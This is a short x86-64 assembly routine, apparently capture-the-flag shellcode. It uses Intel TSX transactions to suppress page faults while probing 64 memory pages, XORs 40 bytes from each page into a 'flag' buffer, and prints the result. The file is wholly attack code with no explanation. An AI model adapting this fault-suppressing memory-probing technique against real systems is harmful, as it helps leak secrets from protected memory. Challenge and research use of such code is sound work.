[BITS 64]

global _start

_start:
	; r10 = mem_base
	; r11 = flag
	mov r10, rdi
	mov r11, rsi

	; r12 = page counter
	mov r12, 0

xor_page:
	; r13 = page
	mov r13, r12
	shl r13, 12
	add r13, r10

	; start transaction
	xbegin fail
	; try to read from the page and xor it with the output buffer
	mov rdi, [r13]
	xor [r11], rdi
	mov rdi, [r13+8]
	xor [r11+8], rdi
	mov rdi, [r13+16]
	xor [r11+16], rdi
	mov rdi, [r13+24]
	xor [r11+24], rdi
	mov rdi, [r13+32]
	xor [r11+32], rdi
	; end transaction
	xend

fail:
	; go to next page or get out
	inc r12
	cmp r12, 64
	jz immaout
	jmp xor_page

immaout:
	; write(1, buf, 40)
	mov rax, 1
	mov rdi, 1
	mov rsi, r11
	mov rdx, 40
	syscall

	; exit
	mov rax, 60
	mov rdi, 0
	syscall

